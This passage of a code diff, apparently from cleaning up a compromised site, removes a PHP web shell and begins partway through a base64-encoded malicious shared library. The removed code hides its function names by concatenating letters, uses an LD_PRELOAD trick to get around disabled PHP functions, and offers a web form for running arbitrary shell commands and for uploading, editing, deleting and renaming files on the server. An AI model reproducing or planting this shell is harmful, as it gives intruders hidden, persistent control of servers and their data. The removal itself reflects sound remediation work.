AAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElCQ18yLjIuNQBleGl0QEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQBfaW5pdABmb3JrQEBHTElCQ18yLjIuNQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5qY3IALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAADIAQAAAAAAAMgBAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAA8AEAAAAAAADwAQAAAAAAAEQAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAADgCAAAAAAAAOAIAAAAAAAD4AQAAAAAAAAQAAAABAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAAAwBAAAAAAAADAEAAAAAAAA6QAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAGgUAAAAAAAAaBQAAAAAAACoAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAAEgFAAAAAAAASAUAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAABoBQAAAAAAAGgFAAAAAAAA2AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAQAYAAAAAAABABgAAAAAAANgAAAAAAAAAAwAAABYAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAABgHAAAAAAAAGAcAAAAAAAAXAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAAAwBwAAAAAAADAHAAAAAAAAoAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAA0AcAAAAAAADQBwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAhwAAAAEAAAAGAAAAAAAAAOAHAAAAAAAA4AcAAAAAAAB6AQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAI0AAAABAAAABgAAAAAAAABcCQAAAAAAAFwJAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACTAAAAAQAAAAIAAAAAAAAAZQkAAAAAAABlCQAAAAAAABMAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAmwAAAAEAAAACAAAAAAAAAHgJAAAAAAAAeAkAAAAAAAA0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKkAAAABAAAAAgAAAAAAAACwCQAAAAAAALAJAAAAAAAAvAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACzAAAADgAAAAMAAAAAAAAA+A0gAAAAAAD4DQAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAvwAAAA8AAAADAAAAAAAAAAgOIAAAAAAACA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAMsAAAABAAAAAwAAAAAAAAAQDiAAAAAAABAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADQAAAABgAAAAMAAAAAAAAAGA4gAAAAAAAYDgAAAAAAAMABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAggAAAAEAAAADAAAAAAAAANgPIAAAAAAA2A8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANkAAAABAAAAAwAAAAAAAAAAECAAAAAAAAAQAAAAAAAAYAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADiAAAAAQAAAAMAAAAAAAAAYBAgAAAAAABgEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA6AAAAAgAAAADAAAAAAAAAGgQIAAAAAAAaBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAO0AAAABAAAAMAAAAAAAAAAAAAAAAAAAAGgQAAAAAAAALQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAACYEAAAAAAAABgGAAAAAAAAGwAAAC0AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAsBYAAAAAAABLAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAPsYAAAAAAAA9gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=';
-        $cmdd = $_POST['cmd_input'];
-        $meterpreter = $en($cmdd." > test.txt");
-        $viewCommandResult = '<hr><p>Result: <font color="black">base64 : ' . $meterpreter .'</br>Please Refresh and Check File test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>MAINHACK</font><br><br></textarea>';        
-        $a($full . '/chankro.so', $base($hook));
-        $a($full . '/acpid.socket', $base($meterpreter));
-        $p('CHANKRO=' . $full . '/acpid.socket');
-        $p('LD_PRELOAD=' . $full . '/chankro.so');
-        $m('a','a','a','a');
-    }elseif (isset($_POST['delete_file'])) {
-        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
-        if (file_exists($fileToDelete)) {
-            if (is_dir($fileToDelete)) {
-                if (deleteDirectory($fileToDelete)) {
-                    echo '<hr>Folder deleted successfully!';
-                } else {
-                    echo '<hr>Error: Failed to delete folder!';
-                }
-            } else {
-                if ($unl($fileToDelete)) {
-                    echo '<hr>File deleted successfully!';
-                } else {
-                    echo '<hr>Error: Failed to delete file!';
-                }
-            }
-        } else {
-            echo '<hr>Error: File or directory not found!';
-        }
-    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
-        $oldName = $currentDirectory . '/' . $_POST['old_name'];
-        $newName = $currentDirectory . '/' . $_POST['new_name'];
-        if (file_exists($oldName)) {
-            if (rename($oldName, $newName)) {
-                echo '<hr>Item renamed successfully!';
-            } else {
-                echo '<hr>Error: Failed to rename item!';
-            }
-        } else {
-            echo '<hr>Error: Item not found!';
-        }
-    }elseif (isset($_POST['cmd_biasa'])) {
-            $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
-            $pc = "f"."c"."l"."o"."s"."e";
-            $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
-            $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-            $command = $_POST['cmd_biasa'];
-            $descriptorspec = [
-                0 => ['pipe', 'r'],
-                1 => ['pipe', 'w'],
-                2 => ['pipe', 'w']
-            ];
-            $process = $pp($command, $descriptorspec, $pipes);
-            if (is_resource($process)) {
-                $output = $stg($pipes[1]);
-                $errors = $stg($pipes[2]);
-                $pc($pipes[1]);
-                $pc($pipes[2]);
-                $ppc($process);
-                if (!empty($errors)) {
-                    $viewCommandResult = '<hr><p>Error: </p><textarea class="result-box">' . $htm($errors) . '</textarea>';
-                } else {
-                    $viewCommandResult = '<hr><p>Result: </p><textarea class="result-box">' . $htm($output) . '</textarea>';
-                }
-            } else {
-                $viewCommandResult = 'Result:</p><textarea class="result-box">Error: Failed to execute command! </textarea>';
-            }
-    } elseif (isset($_POST['view_file'])) {
-        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
-        if (file_exists($fileToView)) {
-            $fileContent = $fgc($fileToView);
-            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p>
-            <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
-            <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
-            <input type="hidden" name="edit_file" value="' . $_POST['view_file'] . '">
-            <input type="submit" value=" Save "></form></td>';
-        } else {
-            $viewCommandResult = '<hr><p>Error: File not found!</p>';
-        }
-    }  elseif (isset($_POST['edit_file'])) {
-        $ef = $currentDirectory . '/' . $_POST['edit_file'];
-        $newContent = $_POST['content'];
-        if ($fpc($ef, $newContent) !== false) {
-            echo '<hr>File Edited successfully! ' . $_POST['edit_file'].'<hr>';
-        } else {
-            echo '<hr>Error: Failed Edit File! ' . $_POST['edit_file'].'<hr>';
-
-        }
-    }
-
+            });
+        </script>
+    </body>
+    </html>
+    <?php
+    exit();
 }
-
-echo '<hr>DIR: ';
-
-$directories = $expl(DIRECTORY_SEPARATOR, $currentDirectory);
-$currentPath = '';
-$homeLinkPrinted = false;
-foreach ($directories as $index => $dir) {
-    $currentPath .= DIRECTORY_SEPARATOR . $dir;
-    if ($index == 0) {
-        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
-    } else {
-        echo '/<a href="?d='. x($currentPath) . '">' . $dir . '</a>';
-    }
-}
-
-echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
-echo '<br>';
-echo '<hr><form method="post" enctype="multipart/form-data">';
-echo '<hr>';
-echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
-echo '<input type="submit" value="Upload File" name="submit">';
-echo '</form><hr>';
-echo '<table border="5"><tbody>
-<tr>
-<td>
-<center>Command BYPASS<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
-<input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form></center></td>
-
-<td><center>Command BIASA<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
-<input type="text" name="cmd_biasa" placeholder="Enter command"><input type="submit" value="Run Command"></form><center></td>
-
-<td><center>Create Folder<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
-<input type="text" name="folder_name" placeholder="Folder Name"><input type="submit" value="Create Folder"></form><center></td>
-<td><center>Create File<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
-<input type="text" name="file_name" placeholder="File Name"><input type="submit" value="Create File"></form></td></tr>
-</tbody></table>';
-echo $viewCommandResult;
-echo '<table border=1>';
-echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
-foreach ($scd($currentDirectory) as $v) {
-    $u = $ril($v);
-    $s = $st($u);
-    $itemLink = $isdir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
-    $permission = substr(sprintf('%o', fileperms($u)), -4);
-    $writable = $isw($u);
-    echo '<tr>
-            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
-            <td class="size">'.filesize($u).'</td>
-            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
-            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
-            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.$htm($v).'"><input type="submit" value=" View "></form></center></td>
-            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.$htm($v).'"><input type="submit" value="Delete"></form></center></td>
-            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.$htm($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
-        </tr>';
-        
-}
-
-echo '</table>';
-function deleteDirectory($dir) {
-   $unl = "u"."n"."l"."i"."n"."k";
-    if (!file_exists($dir)) {
-        return true;
-    }
-    if (!is_dir($dir)) {
-        return $unl($dir);
-    }
-    $scd = "s"."c"."a"."n"."d"."i"."r";
-    foreach ($scd($dir) as $item) {
-        if ($item == '.' || $item == '..') {
-            continue;
-        }
-        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
-            return false;
-        }
-    }
-    return rmdir($dir);
-}
+?>
